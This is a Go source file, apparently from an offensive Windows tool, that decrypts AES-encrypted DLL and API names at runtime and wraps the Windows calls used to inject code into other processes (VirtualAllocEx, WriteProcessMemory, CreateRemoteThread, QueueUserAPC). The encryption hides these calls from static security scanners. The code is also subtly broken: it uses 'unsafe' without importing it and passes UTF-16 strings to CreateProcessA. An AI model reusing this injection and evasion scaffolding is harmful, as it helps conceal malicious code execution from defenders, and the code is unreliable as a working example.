package main

import "syscall"

var ntdll_str string = GetAESDecrypted_aux("FMLM8FlzhmCRhwLeS8VUSg==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var psapi_str string = GetAESDecrypted_aux("Cb84zuSGizGgrwF7p5Fm/A==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var kernel32_str string = GetAESDecrypted_aux("MJQjMjHPudxM3blox+ys0g==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")

var NtGetNextProcess_str string = GetAESDecrypted_aux("zze7aKIbFOm/HFKA2R9AtA==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var GetProcessImageFileNameA_str string = GetAESDecrypted_aux("Zmd7d9pcACTTRmHZ5UfBDL/+dV4ng9TRvlBDjAQL+SI=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var GetProcessId_str string = GetAESDecrypted_aux("yxRxIdBiBeTxdRHNMcW36Q==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var CreateRemoteThread_str string = GetAESDecrypted_aux("pUYSimsZdRtLMhNUecURSH9LA4htjsY31IYSAcIrNpg=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var VirtualProtectEx_str string = GetAESDecrypted_aux("PGIA5riJwMfIjFziWNI0RQ==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var ResumeThread_str string = GetAESDecrypted_aux("offIRQjSOTbThwx44UAPmw==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var OpenProcess_str string = GetAESDecrypted_aux("gIlbTUZa1e0bt0CSDYZmWg==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var VirtualAllocEx_str string = GetAESDecrypted_aux("b5RzbWx3Cn/kpPlDbFFPOg==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var WriteProcessMemory_str string = GetAESDecrypted_aux("b5Iyb3wpHNmw/Mk6KxIZqx3hyYItOdGFEIb5ul1+SZM=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var Thread32First_str string = GetAESDecrypted_aux("BmhaMwsSyepIOR76IQkRsg==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var Thread32Next_str string = GetAESDecrypted_aux("rzofm4pRigZyEIPNe32/iA==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var OpenThread_str string = GetAESDecrypted_aux("d2rGOn2S1EsrYl+GQfh5UQ==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var QueueUserAPC_str string = GetAESDecrypted_aux("jr1ldiiDZqkXSxn0PTnjPg==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var CloseHandle_str string = GetAESDecrypted_aux("I9BzKP3vnDqJJPYVcV38dw==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
var CreateProcessA_str string = GetAESDecrypted_aux("vh75BCTVuMcYSGVlPwepdw==", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")


func NtGetNextProcess(handle uintptr, MAX_ALLOWED int, param3 int, param4 int, outHandle uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(ntdll_str).NewProc(NtGetNextProcess_str).Call(
      uintptr(handle),
      uintptr(MAX_ALLOWED),
      uintptr(param3),
      uintptr(param4),
      uintptr(outHandle),
   )
   return uintptr(ret)
}


func GetProcessImageFileName(hProcess uintptr, lpImageFileName uintptr, nSize int) uintptr {
   ret, _, _ := syscall.NewLazyDLL(psapi_str).NewProc(GetProcessImageFileNameA_str).Call(
      uintptr(hProcess),
      uintptr(lpImageFileName),
      uintptr(nSize),
   )
   return uintptr(ret)
}


func GetProcessId(handle uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(GetProcessId_str).Call(
      uintptr(handle),
   )
   return uintptr(ret)
}


func CreateRemoteThread(hProcess uintptr, lpThreadAttributes uintptr, dwStackSize uint64, lpStartAddress uintptr, lpParameter uintptr, dwCreationFlags uint32, lpThreadId uint32) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(CreateRemoteThread_str).Call(
      uintptr(hProcess),
      uintptr(lpThreadAttributes),
      uintptr(dwStackSize),
      uintptr(lpStartAddress),
      uintptr(lpParameter),
      uintptr(dwCreationFlags),
      uintptr(lpThreadId),      
   )
   return uintptr(ret)
}


func VirtualProtectEx(hProcess uintptr, lpAddress uintptr, dwSize uintptr, flNewProtect uintptr, lpflOldProtect uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(VirtualProtectEx_str).Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(dwSize),
      uintptr(flNewProtect),
      uintptr(lpflOldProtect),
   )
   return uintptr(ret)
}


func ResumeThread(hProcess uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(ResumeThread_str).Call(
      uintptr(hProcess),
   )
   return uintptr(ret)
}


func OpenProcess(processAccess int, bInheritHandle int, processId uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(OpenProcess_str).Call(
      uintptr(processAccess),
      uintptr(bInheritHandle),
      uintptr(processId),
   )
   return uintptr(ret)
}


func VirtualAllocEx(hProcess uintptr, lpAddress uintptr, dwSize uintptr, flAllocationType uint, flProtect uint) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(VirtualAllocEx_str).Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(dwSize),
      uintptr(flAllocationType),
      uintptr(flProtect),
   )
   return uintptr(ret)
}


func WriteProcessMemory(hProcess uintptr, lpAddress uintptr, lpBuffer uintptr, nSize uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(WriteProcessMemory_str).Call(
      uintptr(hProcess),
      uintptr(lpAddress),
      uintptr(lpBuffer),
      uintptr(nSize),
   )
   return uintptr(ret)
}


func Thread32First(hSnapshot uintptr, lpte uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(Thread32First_str).Call(
      uintptr(hSnapshot),
      uintptr(lpte),
   )
   return uintptr(ret)
}


func Thread32Next(hSnapshot uintptr, lpte uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(Thread32Next_str).Call(
      uintptr(hSnapshot),
      uintptr(lpte),
   )
   return uintptr(ret)
}


func OpenThread(dwDesiredAccess uint, bInheritHandle int, dwThreadId uint32) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(OpenThread_str).Call(
      uintptr(dwDesiredAccess),
      uintptr(bInheritHandle),
      uintptr(dwThreadId),
   )
   return uintptr(ret)
}


func QueueUserAPC(pfnAPC uintptr, hThread uintptr, dwData uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(QueueUserAPC_str).Call(
      uintptr(pfnAPC),
      uintptr(hThread),
      uintptr(dwData),
   )
   return uintptr(ret)
}


func CloseHandle(hProcess uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(CloseHandle_str).Call(
      uintptr(hProcess),
   )
   return uintptr(ret)
}


func CreateProcess(lpApplicationName string, lpCommandLine string, lpProcessAttributes uintptr, lpThreadAttributes uintptr,
   bInheritHandles uintptr, dwCreationFlags int, lpEnvironment uintptr, 
   lpCurrentDirectory uintptr, lpStartupInfo uintptr, lpProcessInformation uintptr) uintptr {
   ret, _, _ := syscall.NewLazyDLL(kernel32_str).NewProc(CreateProcessA_str).Call(
      uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpApplicationName))),
      uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCommandLine))),
      uintptr(lpProcessAttributes),
      uintptr(lpThreadAttributes),      
      uintptr(bInheritHandles),
      uintptr(dwCreationFlags),
      uintptr(lpEnvironment),
      // uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(lpCurrentDirectory))),
      uintptr(lpCurrentDirectory),
      uintptr(lpStartupInfo),
      uintptr(lpProcessInformation),

   )
   return uintptr(ret)
}
